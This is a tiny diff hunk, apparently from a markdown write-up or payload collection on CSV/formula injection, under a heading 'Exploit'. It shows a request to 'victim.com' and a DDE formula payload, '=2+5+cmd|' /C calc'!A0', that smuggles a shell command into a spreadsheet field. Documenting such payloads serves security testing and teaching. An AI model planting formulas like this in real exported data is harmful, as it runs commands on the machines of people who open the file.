@@ -39,7 +39,6 @@ Host: victim.com
 
 title
 =2+5+cmd|' /C calc'!A0
-
 ```
 
 ### Exploit
